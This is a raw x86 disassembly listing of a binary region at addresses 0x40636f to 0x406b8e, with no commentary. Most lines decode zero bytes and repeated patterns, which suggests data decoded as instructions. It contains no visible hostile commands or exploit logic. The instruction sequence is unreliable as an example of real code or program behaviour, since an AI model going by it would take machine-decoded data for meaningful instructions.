  40636f:	add    BYTE PTR [eax+0x25209100],al
  406375:	pop    es
  406376:	lea    esp,[ebx]
  406378:	push   esi
  406379:	add    BYTE PTR [eax],al
  40637b:	add    BYTE PTR [eax],al
  40637d:	add    BYTE PTR [eax+0x1a209100],al
  406383:	pop    es
  406384:	and    DWORD PTR [ebx],0x58
  40638a:	add    BYTE PTR [eax],al
  40638c:	add    BYTE PTR [eax],0x91
  40638f:	and    BYTE PTR [edi+0xa],ch
  406392:	jp     0x4063b8
  406394:	pop    esi
  406395:	add    BYTE PTR [eax],al
  406397:	add    BYTE PTR [eax],al
  406399:	add    BYTE PTR [eax],al
  40639b:	add    BYTE PTR [ecx-0x7bf582e0],dl
  4063a1:	and    al,0x61
  4063a3:	add    BYTE PTR [eax],al
  4063a5:	add    BYTE PTR [eax],al
  4063a7:	add    BYTE PTR [eax],al
  4063a9:	add    BYTE PTR [ecx-0x71f56ae0],dl
  4063af:	and    al,0x64
  4063b1:	add    BYTE PTR [ecx],dh
  4063b3:	aaa    
  4063b4:	add    BYTE PTR [eax],al
  4063b6:	add    BYTE PTR [eax],al
  4063b8:	xchg   BYTE PTR [eax],bl
  4063ba:	jns    0x4063c2
  4063bc:	pop    ecx
  4063bd:	and    ebp,DWORD PTR [edx+0x0]
  4063c0:	das    
  4063c1:	aaa    
  4063c2:	add    BYTE PTR [eax],al
  4063c4:	add    BYTE PTR [eax],al
  4063c6:	xchg   ecx,eax
  4063c7:	sbb    bl,dh
  4063c9:	adc    al,0x1d
  4063cb:	and    ebp,DWORD PTR [edx+0x0]
  4063ce:	add    BYTE PTR [eax],al
  4063d0:	add    BYTE PTR [eax],al
  4063d2:	add    BYTE PTR [eax],al
  4063d4:	mov    BYTE PTR ds:0x24a60adc,0x6a
  4063db:	add    BYTE PTR [edi+esi*1],bh
  4063de:	add    BYTE PTR [eax],al
  4063e0:	add    BYTE PTR [eax],al
  4063e2:	mov    BYTE PTR [ecx],0xdc
  4063e5:	or     ah,BYTE PTR [esi+0x2e007024]
  4063eb:	cmp    BYTE PTR [eax],al
  4063ed:	add    BYTE PTR [eax],al
  4063ef:	add    BYTE PTR [esi+0x59067918],al
  4063f5:	and    esi,DWORD PTR [esi+0x0]
  4063f8:	cmp    BYTE PTR [eax],bh
  4063fa:	add    BYTE PTR [eax],al
  4063fc:	add    BYTE PTR [eax],al
  4063fe:	xchg   BYTE PTR [eax],bl
  406400:	jns    0x406408
  406402:	pop    ds
  406403:	and    al,0x76
  406405:	add    BYTE PTR [eax+0x38],cl
  40640b:	add    BYTE PTR [esi-0x4ef4f900],al
  406411:	and    al,0x77
  406413:	add    BYTE PTR [eax],al
  406415:	add    BYTE PTR [eax],al
  406417:	add    BYTE PTR [eax],al
  406419:	add    dh,al
  40641b:	add    eax,0x23590b17
  406420:	jns    0x406422
  406422:	add    BYTE PTR [eax],al
  406424:	add    BYTE PTR [eax],al
  406426:	add    BYTE PTR [eax],al
  406428:	mov    BYTE PTR ds:0x23590b26,0x79
  40642f:	add    BYTE PTR [eax],al
  406431:	add    BYTE PTR [eax],al
  406433:	add    BYTE PTR [eax],al
  406435:	add    dh,al
  406437:	add    eax,0x23590b2e
  40643c:	jns    0x40643e
  40643e:	add    BYTE PTR [eax],al
  406440:	add    BYTE PTR [eax],al
  406442:	add    BYTE PTR [eax],al
  406444:	mov    BYTE PTR ds:0x23590b39,0x79
  40644b:	add    BYTE PTR [eax],al
  40644d:	add    BYTE PTR [eax],al
  40644f:	add    BYTE PTR [eax],al
  406451:	add    dh,al
  406453:	add    eax,0x23590b41
  406458:	jns    0x40645a
  40645a:	add    BYTE PTR [eax],al
  40645c:	add    BYTE PTR [eax],al
  40645e:	add    BYTE PTR [eax],al
  406460:	mov    BYTE PTR ds:0x23590b4e,0x79
  406467:	add    BYTE PTR [eax],al
  406469:	add    BYTE PTR [eax],al
  40646b:	add    BYTE PTR [eax],al
  40646d:	add    dh,al
  40646f:	add    eax,0x23590b5e
  406474:	jns    0x406476
  406476:	add    BYTE PTR [eax],al
  406478:	add    BYTE PTR [eax],al
  40647a:	add    BYTE PTR [eax],al
  40647c:	mov    BYTE PTR ds:0x23590b6d,0x79
  406483:	add    BYTE PTR [eax],al
  406485:	add    BYTE PTR [eax],al
  406487:	add    BYTE PTR [eax],al
  406489:	add    dh,al
  40648b:	add    eax,0x23590b75
  406490:	jns    0x406492
  406492:	add    BYTE PTR [eax],al
  406494:	add    BYTE PTR [eax],al
  406496:	add    BYTE PTR [eax],al
  406498:	mov    BYTE PTR ds:0x23590b81,0x79
  40649f:	add    BYTE PTR [ebx],cl
  4064a1:	cmp    al,BYTE PTR [eax]
  4064a3:	add    BYTE PTR [eax],al
  4064a5:	add    dh,ah
  4064a7:	add    DWORD PTR [edx+0x7924b90b],esp
  4064ad:	add    BYTE PTR [edx+edi*1],dh
  4064b0:	add    BYTE PTR [eax],al
  4064b2:	add    BYTE PTR [eax],al
  4064b4:	out    0x1,al
  4064b6:	scas   al,BYTE PTR es:[edi]
  4064b7:	or     eax,ecx
  4064b9:	and    al,0x7c
  4064bb:	add    ah,dh
  4064bd:	cmp    eax,DWORD PTR [eax]
  4064bf:	add    BYTE PTR [eax],al
  4064c1:	add    dh,ah
  4064c3:	add    DWORD PTR [ecx+0x7d24c70b],edi
  4064c9:	add    BYTE PTR [edi+0x3c],ah
  4064cf:	add    BYTE PTR [esi+0x59067918],al
  4064d5:	and    edi,DWORD PTR [ebp+0x0]
  4064d8:	scas   eax,DWORD PTR es:[edi]
  4064d9:	cmp    al,0x0
  4064db:	add    BYTE PTR [eax],al
  4064dd:	add    BYTE PTR [esi+0x59067918],al
  4064e3:	and    edi,DWORD PTR [ebp+0x0]
  4064e6:	mov    bh,0x3c
  4064e8:	add    BYTE PTR [eax],al
  4064ea:	add    BYTE PTR [eax],al
  4064ec:	xchg   esi,eax
  4064ed:	add    BYTE PTR [ecx+0xc],ah
  4064f0:	shl    DWORD PTR [edi*2+0x3cc000],cl
  4064f7:	add    BYTE PTR [eax],al
  4064f9:	add    BYTE PTR [esi-0x27f39f00],dl
  4064ff:	and    al,0x7e
  406501:	add    ch,ah
  406503:	cmp    al,0x0
  406505:	add    BYTE PTR [eax],al
  406507:	add    BYTE PTR [esi-0x21f39f00],dl
  40650d:	and    al,0x80
  40650f:	add    al,dh
  406511:	cmp    al,0x0
  406513:	add    BYTE PTR [eax],al
  406515:	add    BYTE PTR [esi-0x1bf39f00],dl
  40651b:	and    al,0x82
  40651d:	add    BYTE PTR [esi],dl
  40651f:	cmp    eax,0x0
  406524:	xchg   esi,eax
  406525:	add    BYTE PTR [ecx+0xc],ah
  406528:	jmp    0x40654e
  40652a:	test   DWORD PTR [eax],eax
  40652c:	and    al,0x3d
  40652e:	add    BYTE PTR [eax],al
  406530:	add    BYTE PTR [eax],al
  406532:	xchg   esi,eax
  406533:	add    BYTE PTR [ecx+0xc],ah
  406536:	repz and al,0x89
  406539:	add    BYTE PTR [eax+0x3d],dh
  40653c:	add    BYTE PTR [eax],al
  40653e:	add    BYTE PTR [eax],al
  406540:	xchg   esi,eax
  406541:	add    BYTE PTR [esp+ecx*1-0x2d],ch
  406545:	and    al,0x8e
  406547:	add    BYTE PTR [esi+0x3d],dl
  40654d:	add    BYTE PTR [esi-0x21f39400],dl
  406553:	and    al,0x8f
  406555:	add    BYTE PTR [eax+0x3d],ah
  40655b:	add    BYTE PTR [esi-0x1bf39400],dl
  406561:	and    al,0x91
  406563:	add    ch,cl
  406565:	cmp    eax,0x0
  40656a:	xchg   esi,eax
  40656b:	add    BYTE PTR [esp+ecx*1-0x15],ch
  40656f:	and    al,0x94
  406571:	add    ah,bl
  406573:	cmp    eax,0x0
  406578:	xchg   esi,eax
  406579:	add    BYTE PTR [esp+ecx*1-0xd],ch
  40657d:	and    al,0x98
  40657f:	add    BYTE PTR ds:0x3e,ch
  406585:	add    BYTE PTR [esi-0x2cf38700],dl
  40658b:	and    al,0x9d
  40658d:	add    BYTE PTR [esi+edi*1],bh
  406590:	add    BYTE PTR [eax],al
  406592:	add    BYTE PTR [eax],al
  406594:	xchg   esi,eax
  406595:	add    BYTE PTR [ebx-0x61db03f4],al
  40659b:	add    BYTE PTR [esi+edi*1+0x0],al
  40659f:	add    BYTE PTR [eax],al
  4065a1:	add    BYTE PTR [esi+0x59067918],al
  4065a7:	and    ebx,DWORD PTR [edi+0x1000000]
  4065ad:	add    BYTE PTR [edi+0x100000c],dl
  4065b3:	add    BYTE PTR [edi+0x100000c],dl
  4065b9:	add    BYTE PTR [edi+0x100000c],dl
  4065bf:	add    BYTE PTR [edi+0x200000c],dl
  4065c5:	add    BYTE PTR [ebx+0x100000c],bl
  4065cb:	add    BYTE PTR [edi+0x200000c],dl
  4065d1:	add    BYTE PTR [ebx+0x300000c],bl
  4065d7:	add    BYTE PTR [esi+0x100000c],bl
  4065dd:	add    BYTE PTR [edi+0x200000c],dl
  4065e3:	add    BYTE PTR [ebx+0x300000c],bl
  4065e9:	add    BYTE PTR [esi+0x400000c],bl
  4065ef:	add    BYTE PTR [ecx+0x100000c],ah
  4065f5:	add    BYTE PTR [edi+0x200000c],dl
  4065fb:	add    BYTE PTR [ebx+0x300000c],bl
  406601:	add    BYTE PTR [esi+0x400000c],bl
  406607:	add    BYTE PTR [ecx+0x500000c],ah
  40660d:	add    BYTE PTR [esp+ecx*1+0x10000],ah
  406614:	xchg   edi,eax
  406615:	or     al,0x0
  406617:	add    BYTE PTR [edx],al
  406619:	add    BYTE PTR [ebx+0x300000c],bl
  40661f:	add    BYTE PTR [esi+0x400000c],bl
  406625:	add    BYTE PTR [ecx+0x500000c],ah
  40662b:	add    BYTE PTR [esp+ecx*1+0x60000],ah
  406632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406633:	or     al,0x0
  406635:	add    BYTE PTR [ecx],al
  406637:	add    BYTE PTR [edi+0x200000c],dl
  40663d:	add    BYTE PTR [ebx+0x300000c],bl
  406643:	add    BYTE PTR [esi+0x400000c],bl
  406649:	add    BYTE PTR [ecx+0x500000c],ah
  40664f:	add    BYTE PTR [esp+ecx*1+0x60000],ah
  406656:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406657:	or     al,0x0
  406659:	add    BYTE PTR [edi],al
  40665b:	add    BYTE PTR [edx+0x100000c],ch
  406661:	add    BYTE PTR [ebp+0x100000c],ch
  406667:	add    BYTE PTR [ebx+0x100000c],dh
  40666d:	add    BYTE PTR [esp+ecx*1+0x10000],bh
  406674:	lods   eax,DWORD PTR ds:[esi]
  406675:	or     al,0x0
  406677:	add    BYTE PTR [edx],al
  406679:	add    ah,al
  40667b:	or     al,0x0
  40667d:	add    BYTE PTR [ebx],al
  40667f:	add    ah,cl
  406681:	or     al,0x0
  406683:	add    BYTE PTR [ecx],al
  406685:	add    bh,dl
  406687:	or     al,0x0
  406689:	add    BYTE PTR [edx],al
  40668b:	add    ah,bl
  40668d:	or     al,0x0
  40668f:	add    BYTE PTR [ebx],al
  406691:	add    ch,ah
  406693:	or     al,0x0
  406695:	add    BYTE PTR [eax+eax*1],al
  406698:	out    dx,eax
  406699:	or     al,0x0
  40669b:	add    BYTE PTR ds:0xcfe00,al
  4066a1:	add    BYTE PTR [esi],al
  4066a3:	add    BYTE PTR ds:0x100000d,al
  4066a9:	add    BYTE PTR [esi],cl
  4066ab:	or     eax,0x20000
  4066b0:	adc    eax,0x100000d
  4066b5:	add    BYTE PTR ds:0x200000d,bl
  4066bb:	add    BYTE PTR ds:0x100000d,ah
  4066c1:	add    BYTE PTR [esi],ch
  4066c3:	or     eax,0x10000
  4066c8:	aaa    
  4066c9:	or     eax,0x20002
  4066ce:	ds or  eax,0x30002
  4066d4:	pop    edx
  4066d5:	or     eax,0x10000
  4066da:	lods   eax,DWORD PTR ds:[esi]
  4066db:	or     al,0x0
  4066dd:	add    BYTE PTR [edx],al
  4066df:	add    BYTE PTR [eax+0xd],ch
  4066e2:	add    BYTE PTR [eax],al
  4066e4:	add    DWORD PTR [eax],eax
  4066e6:	jae    0x4066f5
  4066e8:	add    BYTE PTR [eax],al
  4066ea:	add    al,BYTE PTR [eax]
  4066ec:	or     DWORD PTR ds:0x30000,0xffffff92
  4066f3:	or     eax,0x40000
  4066f8:	lahf   
  4066f9:	or     eax,0x50000
  4066fe:	mov    al,0xd
  406700:	add    BYTE PTR [eax],al
  406702:	push   es
  406703:	add    BYTE PTR [ebx+0x700000d],bh
  406709:	add    dl,cl
  40670b:	or     eax,0x80000
  406710:	aad    0xd
  406712:	add    BYTE PTR [eax],al
  406714:	or     DWORD PTR [eax],eax
  406716:	fisttp QWORD PTR ds:0xa0000
  40671c:	jmp    0xb40672e
  406721:	add    dh,dh
  406723:	or     eax,0x10000
  406728:	lock or BYTE PTR [eax],al
  40672b:	add    BYTE PTR [edx],al
  40672d:	add    dh,dh
  40672f:	or     BYTE PTR [eax],al
  406731:	add    BYTE PTR [ebx],al
  406733:	add    BYTE PTR [ebx],al
  406735:	or     DWORD PTR [eax],eax
  406737:	add    BYTE PTR [ecx],al
  406739:	add    ah,bh
  40673b:	or     eax,0x10000
  406740:	or     DWORD PTR [ecx],0x10000
  406746:	dec    BYTE PTR ds:0x10000
  40674c:	add    al,0xe
  40674e:	add    BYTE PTR [eax],al
  406750:	add    DWORD PTR [eax],eax
  406752:	or     al,0xe
  406754:	add    BYTE PTR [eax],al
  406756:	add    al,BYTE PTR [eax]
  406758:	or     DWORD PTR ds:0x10000,0x10
  40675f:	push   cs
  406760:	add    BYTE PTR [eax],al
  406762:	add    DWORD PTR [eax],eax
  406764:	xchg   edi,eax
  406765:	or     al,0x0
  406767:	add    BYTE PTR [edx],al
  406769:	add    BYTE PTR [esi+ecx*1],bl
  40676c:	add    BYTE PTR [eax],al
  40676e:	add    DWORD PTR [eax],eax
  406770:	xchg   edi,eax
  406771:	or     al,0x0
  406773:	add    BYTE PTR [edx],al
  406775:	add    BYTE PTR [esi+ecx*1],bl
  406778:	add    BYTE PTR [eax],al
  40677a:	add    DWORD PTR [eax],eax
  40677c:	or     al,0xe
  40677e:	add    BYTE PTR [eax],al
  406780:	add    al,BYTE PTR [eax]
  406782:	test   BYTE PTR ds:0x10000,0xc
  406789:	push   cs
  40678a:	add    BYTE PTR [eax],al
  40678c:	add    al,BYTE PTR [eax]
  40678e:	test   BYTE PTR ds:0x10000,0xf6
  406795:	or     eax,0x10000
  40679a:	test   BYTE PTR ds:0x10000,0x24
  4067a1:	push   cs
  4067a2:	add    BYTE PTR [eax],al
  4067a4:	add    al,BYTE PTR [eax]
  4067a6:	cs push cs
  4067a8:	add    BYTE PTR [eax],al
  4067aa:	add    DWORD PTR [eax],eax
  4067ac:	push   cs
  4067ad:	or     eax,0x20000
  4067b2:	adc    eax,0x100000d
  4067b7:	add    bh,dl
  4067b9:	or     al,0x0
  4067bb:	add    BYTE PTR [edx],al
  4067bd:	add    ah,bl
  4067bf:	or     al,0x0
  4067c1:	add    BYTE PTR [ebx],al
  4067c3:	add    ch,ah
  4067c5:	or     al,0x0
  4067c7:	add    BYTE PTR [eax+eax*1],al
  4067ca:	out    dx,eax
  4067cb:	or     al,0x0
  4067cd:	add    BYTE PTR ds:0xcfe00,al
  4067d3:	add    BYTE PTR [esi],al
  4067d5:	add    BYTE PTR ds:0x100000d,al
  4067db:	add    BYTE PTR [ebx+0x200000d],al
  4067e1:	add    BYTE PTR [eax],dh
  4067e3:	push   cs
  4067e4:	add    al,BYTE PTR [eax]
  4067e6:	add    eax,DWORD PTR [eax]
  4067e8:	cmp    BYTE PTR [esi],cl
  4067ea:	add    BYTE PTR [eax],al
  4067ec:	add    DWORD PTR [eax],eax
  4067ee:	or     DWORD PTR ds:0x20000,0x30
  4067f5:	push   cs
  4067f6:	add    BYTE PTR [eax],al
  4067f8:	add    eax,DWORD PTR [eax]
  4067fa:	inc    eax
  4067fb:	push   cs
  4067fc:	add    BYTE PTR [eax],al
  4067fe:	add    DWORD PTR [eax],eax
  406800:	or     DWORD PTR ds:0x20002,0x49
  406807:	push   cs
  406808:	add    al,BYTE PTR [eax]
  40680a:	add    eax,DWORD PTR [eax]
  40680c:	push   esp
  40680d:	push   cs
  40680e:	add    al,BYTE PTR [eax]
  406810:	add    al,0x0
  406812:	popa   
  406813:	push   cs
  406814:	add    al,BYTE PTR [eax]
  406816:	add    eax,0x20e7200
  40681b:	add    BYTE PTR [esi],al
  40681d:	add    BYTE PTR [ebx+0x100000e],al
  406823:	add    BYTE PTR [esi+ecx*1+0x20000],dl
  40682a:	lock or BYTE PTR [eax],al
  40682d:	add    BYTE PTR [ebx],al
  40682f:	add    BYTE PTR [ebx+0x400000e],ah
  406835:	add    BYTE PTR [eax+0x500000e],ch
  40683b:	add    BYTE PTR [esi+0x600000e],dh
  406841:	add    ah,al
  406843:	push   cs
  406844:	add    BYTE PTR [eax],al
  406846:	add    DWORD PTR [eax],eax
  406848:	xchg   esp,eax
  406849:	push   cs
  40684a:	add    BYTE PTR [eax],al
  40684c:	add    al,BYTE PTR [eax]
  40684e:	lock or BYTE PTR [eax],al
  406851:	add    BYTE PTR [ebx],al
  406853:	add    BYTE PTR [ebx+0x400000e],ah
  406859:	add    BYTE PTR [eax+0x500000e],ch
  40685f:	add    BYTE PTR [esi+0x600000e],dh
  406865:	add    ah,al
  406867:	push   cs
  406868:	add    BYTE PTR [eax],al
  40686a:	add    DWORD PTR [eax],eax
  40686c:	int3   
  40686d:	push   cs
  40686e:	add    BYTE PTR [eax],al
  406870:	add    DWORD PTR [eax],eax
  406872:	aad    0xe
  406874:	add    BYTE PTR [eax],al
  406876:	add    al,BYTE PTR [eax]
  406878:	fmul   QWORD PTR [esi]
  40687a:	add    BYTE PTR [eax],al
  40687c:	add    DWORD PTR [eax],eax
  40687e:	loope  0x40688e
  406880:	add    BYTE PTR [eax],al
  406882:	add    al,BYTE PTR [eax]
  406884:	jmp    0x406894
  406886:	add    BYTE PTR [eax],al
  406888:	add    eax,DWORD PTR [eax]
  40688a:	cmc    
  40688b:	push   cs
  40688c:	add    BYTE PTR [eax],al
  40688e:	add    DWORD PTR [eax],eax
  406890:	or     al,0xe
  406892:	add    BYTE PTR [eax],al
  406894:	add    DWORD PTR [eax],eax
  406896:	dec    BYTE PTR [esi]
  406898:	add    BYTE PTR [eax],al
  40689a:	add    DWORD PTR [eax],eax
  40689c:	dec    BYTE PTR [esi]
  40689e:	add    BYTE PTR [eax],al
  4068a0:	add    al,BYTE PTR [eax]
  4068a2:	push   es
  4068a3:	sldt   WORD PTR [eax]
  4068a6:	add    DWORD PTR [eax],eax
  4068a8:	dec    BYTE PTR [esi]
  4068aa:	add    BYTE PTR [eax],al
  4068ac:	add    al,BYTE PTR [eax]
  4068ae:	fmul   QWORD PTR [eax+eax*1]
  4068b1:	add    BYTE PTR [ecx],al
  4068b3:	add    dh,bh
  4068b5:	push   cs
  4068b6:	add    BYTE PTR [eax],al
  4068b8:	add    al,BYTE PTR [eax]
  4068ba:	fmul   QWORD PTR [eax+eax*1]
  4068bd:	add    BYTE PTR [ebx],al
  4068bf:	add    BYTE PTR [esi],al
  4068c1:	sldt   WORD PTR [eax]
  4068c4:	add    DWORD PTR [eax],eax
  4068c6:	dec    BYTE PTR [esi]
  4068c8:	add    BYTE PTR [eax],al
  4068ca:	add    al,BYTE PTR [eax]
  4068cc:	fmul   QWORD PTR [eax+eax*1]
  4068cf:	add    BYTE PTR [ebx],al
  4068d1:	add    BYTE PTR [edx],dl
  4068d3:	sldt   WORD PTR [eax]
  4068d6:	add    al,0x0
  4068d8:	pop    ss
  4068d9:	sldt   WORD PTR [eax]
  4068dc:	add    DWORD PTR [eax],eax
  4068de:	dec    BYTE PTR [esi]
  4068e0:	add    BYTE PTR [eax],al
  4068e2:	add    al,BYTE PTR [eax]
  4068e4:	fmul   QWORD PTR [eax+eax*1]
  4068e7:	add    BYTE PTR [ebx],al
  4068e9:	add    BYTE PTR [edx],dl
  4068eb:	sldt   WORD PTR [eax]
  4068ee:	add    al,0x0
  4068f0:	pop    ss
  4068f1:	sldt   WORD PTR [eax]
  4068f4:	add    eax,0xf0600
  4068f9:	add    BYTE PTR [ecx],al
  4068fb:	add    dh,bh
  4068fd:	push   cs
  4068fe:	add    BYTE PTR [eax],al
  406900:	add    DWORD PTR [eax],eax
  406902:	dec    BYTE PTR [esi]
  406904:	add    BYTE PTR [eax],al
  406906:	add    al,BYTE PTR [eax]
  406908:	fmul   QWORD PTR [eax+eax*1]
  40690b:	add    BYTE PTR [ecx],al
  40690d:	add    dh,bh
  40690f:	push   cs
  406910:	add    BYTE PTR [eax],al
  406912:	add    al,BYTE PTR [eax]
  406914:	fmul   QWORD PTR [eax+eax*1]
  406917:	add    BYTE PTR [ebx],al
  406919:	add    BYTE PTR [esi],bl
  40691b:	sldt   WORD PTR [eax]
  40691e:	add    DWORD PTR [eax],eax
  406920:	dec    BYTE PTR [esi]
  406922:	add    BYTE PTR [eax],al
  406924:	add    al,BYTE PTR [eax]
  406926:	fmul   QWORD PTR [eax+eax*1]
  406929:	add    BYTE PTR [ebx],al
  40692b:	add    BYTE PTR [edx],dl
  40692d:	sldt   WORD PTR [eax]
  406930:	add    al,0x0
  406932:	pop    ss
  406933:	sldt   WORD PTR [eax]
  406936:	add    DWORD PTR [eax],eax
  406938:	dec    BYTE PTR [esi]
  40693a:	add    BYTE PTR [eax],al
  40693c:	add    al,BYTE PTR [eax]
  40693e:	fmul   QWORD PTR [eax+eax*1]
  406941:	add    BYTE PTR [ebx],al
  406943:	add    BYTE PTR [edx],dl
  406945:	sldt   WORD PTR [eax]
  406948:	add    al,0x0
  40694a:	pop    ss
  40694b:	sldt   WORD PTR [eax]
  40694e:	add    eax,0xf1e00
  406953:	add    BYTE PTR [ecx],al
  406955:	add    dh,bh
  406957:	push   cs
  406958:	add    BYTE PTR [eax],al
  40695a:	add    DWORD PTR [eax],eax
  40695c:	sub    al,0xf
  40695e:	adc    al,BYTE PTR [eax]
  406960:	inc    esp
  406961:	add    BYTE PTR ds:0x15001100,dl
  406967:	add    BYTE PTR ds:0x79008100,dl
  40696d:	push   es
  40696e:	pop    ecx
  40696f:	and    ecx,DWORD PTR [ecx+0x1067900]
  406975:	and    eax,0x6790091
  40697a:	add    DWORD PTR ds:0x6790099,esp
  406980:	pop    ds
  406981:	and    al,0xa1
  406983:	add    BYTE PTR [ecx+0x6],bh
  406986:	pop    ds
  406987:	and    al,0xa9
  406989:	add    BYTE PTR [ecx+0x6],bh
  40698c:	pop    ds
  40698d:	and    al,0xb1
  40698f:	add    BYTE PTR [ecx+0x6],bh
  406992:	pop    ds
  406993:	and    al,0xb9
  406995:	add    BYTE PTR [ecx+0x6],bh
  406998:	pop    ds
  406999:	and    al,0xc1
  40699b:	add    BYTE PTR [ecx+0x6],bh
  40699e:	pop    ds
  40699f:	and    al,0xc9
  4069a1:	add    BYTE PTR [ecx+0x6],bh
  4069a4:	pop    ds
  4069a5:	and    al,0xd1
  4069a7:	add    BYTE PTR [ecx+0x6],bh
  4069aa:	pop    ds
  4069ab:	and    al,0xd9
  4069ad:	add    BYTE PTR [ecx+0x6],bh
  4069b0:	pop    ds
  4069b1:	and    al,0xe1
  4069b3:	add    BYTE PTR [ecx+0x6],bh
  4069b6:	pop    ds
  4069b7:	and    al,0xe9
  4069b9:	add    BYTE PTR [ecx+0x6],bh
  4069bc:	pop    ds
  4069bd:	and    al,0xf1
  4069bf:	add    BYTE PTR [ecx+0x6],bh
  4069c2:	add    DWORD PTR ds:0x67900f9,esp
  4069c8:	pop    ds
  4069c9:	and    al,0x1
  4069cb:	add    DWORD PTR [ecx+0x6],edi
  4069ce:	push   es
  4069cf:	and    eax,0x6790111
  4069d4:	or     eax,0x79011925
  4069d9:	push   es
  4069da:	pop    ecx
  4069db:	and    esp,DWORD PTR [ecx]
  4069dd:	add    DWORD PTR [ebx+0x11],edi
  4069e0:	mov    ah,0x25
  4069e2:	pop    ecx
  4069e3:	add    BYTE PTR [ebp+0x3125bd11],cl
  4069e9:	add    BYTE PTR [ecx+0x6],bh
  4069ec:	lds    esp,FWORD PTR ds:0x11a00131
  4069f2:	int3   
  4069f3:	and    eax,0x6790139
  4069f8:	pop    ds
  4069f9:	and    al,0x31
  4069fb:	add    BYTE PTR [eax+0x6],dl
  4069fe:	xlat   BYTE PTR ds:[ebx]
  4069ff:	and    eax,0x11dd0131
  406a04:	and    esi,DWORD PTR es:[ecx]
  406a07:	add    ebp,ebx
  406a09:	adc    DWORD PTR [ebx+eiz*1],ebp
  406a0c:	xor    DWORD PTR [ecx],eax
  406a0e:	fst    QWORD PTR [ecx]
  406a10:	xor    esp,DWORD PTR [ebx]
  406a12:	xor    DWORD PTR [ecx],eax
  406a14:	fst    QWORD PTR [ecx]
  406a16:	fbld   TBYTE PTR ds:0x6790009
  406a1c:	pop    ecx
  406a1d:	and    ecx,DWORD PTR [ecx+0x1]
  406a20:	jns    0x406a28
  406a22:	pop    ds
  406a23:	and    al,0x51
  406a25:	add    DWORD PTR [esi],eax
  406a27:	adc    bl,BYTE PTR [ebp+0x13014123]
  406a2d:	adc    ch,bh
  406a2f:	and    eax,0x12280131
  406a34:	cmc    
  406a35:	and    eax,0x12350159
  406a3a:	and    DWORD PTR [ebx],esp
  406a3c:	popa   
  406a3d:	add    DWORD PTR [eax+0x12],edx
  406a40:	jmp    DWORD PTR ds:0x12650161
  406a46:	add    al,0x26
  406a48:	jno    0x406a4b
  406a4a:	adc    DWORD PTR [edx],0x131260b
  406a50:	xchg   esi,eax
  406a51:	adc    cl,ch
  406a53:	and    esi,DWORD PTR [ecx+0x1]
  406a56:	mov    eax,ds:0x7924d312
  406a5b:	add    DWORD PTR [ecx+0x6],edi
  406a5e:	pop    ecx
  406a5f:	and    edi,DWORD PTR [ecx+0x1]
  406a62:	lds    edx,FWORD PTR [edx]
  406a64:	pop    ds
  406a65:	and    al,0x81
  406a67:	add    DWORD PTR [ebx],eax
  406a69:	adc    ecx,DWORD PTR [edi]
  406a6b:	and    DWORD PTR es:[ecx],eax
  406a6e:	adc    BYTE PTR [ebx],dl
  406a70:	sbb    al,0x26
  406a72:	pop    ecx
  406a73:	add    BYTE PTR [edx],ch
  406a75:	adc    esp,DWORD PTR [ecx]
  406a77:	es xchg ecx,eax
  406a79:	add    DWORD PTR [edx],esi
  406a7b:	adc    ebx,DWORD PTR [ebp+0x64018123]
  406a81:	adc    esp,DWORD PTR [edi]
  406a83:	es cdq 
  406a85:	add    DWORD PTR [edi+0x13],esi
  406a88:	das    
  406a89:	add    DWORD PTR es:[ecx],0x2633137e
  406a90:	popa   
  406a91:	add    BYTE PTR [ebp+0x61239d13],al
  406a97:	add    BYTE PTR [ecx+0x9263a13],dl
  406a9d:	add    BYTE PTR [ecx-0x5edc62ed],bl
  406aa3:	add    DWORD PTR [edx+0x41265813],edi
  406aa9:	add    esp,ecx
  406aab:	adc    ebp,edi
  406aad:	and    eax,0x13e10141
  406ab2:	pop    esi
  406ab3:	mov    eax,es:0x6413fd01
  406ab9:	es jno 0x406abd
  406abc:	and    dl,BYTE PTR [ebx+ebp*2]
  406abf:	es test eax,0x71143b01
  406ac5:	es mov ecx,0x77145901
  406acb:	rol    DWORD PTR es:[ecx],0x6c
  406acf:	adc    al,0xcd
  406ad1:	and    esp,DWORD PTR [ecx+0x5e13cc01]
  406ad7:	es inc ecx
  406ad9:	add    DWORD PTR [edx-0x36d982ec],eax
  406adf:	add    DWORD PTR [edi-0x36dc32ec],ecx
  406ae5:	add    DWORD PTR [edi+0x4123cd14],ebx
  406aeb:	add    DWORD PTR [ecx+0x6],edi
  406aee:	pop    ds
  406aef:	and    al,0x59
  406af1:	add    eax,eax
  406af3:	push   es
  406af4:	and    DWORD PTR [ebx],esp
  406af6:	rol    DWORD PTR [ecx],1
  406af8:	push   eax
  406af9:	adc    bh,bh
  406afb:	and    eax,0x6790039
  406b00:	or     eax,0xb5003925
  406b05:	adc    al,0xcd
  406b07:	and    esi,DWORD PTR [ecx]
  406b09:	add    DWORD PTR [ecx+0x31268f08],esi
  406b0f:	add    edi,eax
  406b11:	adc    al,0x94
  406b13:	xor    DWORD PTR es:[ecx],eax
  406b16:	mov    al,ds:0x3126b711
  406b1b:	add    DWORD PTR [eax-0x16d941ef],esp
  406b21:	add    DWORD PTR [ecx+0x6],edi
  406b24:	pop    ds
  406b25:	and    al,0x31
  406b27:	add    DWORD PTR [edx],eax
  406b29:	adc    eax,0x13126cb
  406b2e:	or     dl,BYTE PTR ds:0x131268f
  406b34:	adc    eax,0x3126d215
  406b39:	add    DWORD PTR [edi],ebx
  406b3b:	adc    eax,0x13126e3
  406b40:	adc    eax,0xf926e915
  406b45:	add    DWORD PTR [eax],esi
  406b47:	adc    eax,0x1126ef
  406b4c:	jns    0x406b54
  406b4e:	pop    ecx
  406b4f:	and    ecx,DWORD PTR [ecx+0x0]
  406b52:	xor    eax,0x9271115
  406b57:	add    BYTE PTR [eax+0x5923cd08],bh
  406b5d:	add    BYTE PTR [ecx+0x15],al
  406b60:	push   ds
  406b61:	daa    
  406b62:	xchg   ecx,eax
  406b63:	add    DWORD PTR [ebx+0x7],ebx
  406b66:	popf   
  406b67:	and    ebx,DWORD PTR [ecx+0x1]
  406b6a:	pop    eax
  406b6b:	adc    eax,0x1312724
  406b70:	mov    al,ds:0x1272411
  406b75:	add    bh,BYTE PTR [ecx+0x6]
  406b78:	pop    ecx
  406b79:	and    ecx,DWORD PTR [ecx]
  406b7b:	add    al,BYTE PTR [ebx+0x69273315]
  406b81:	add    BYTE PTR [ecx+0x6],bh
  406b84:	or     eax,0x9c006925
  406b89:	adc    eax,0x2112752
  406b8e:	mov    dl,0x15
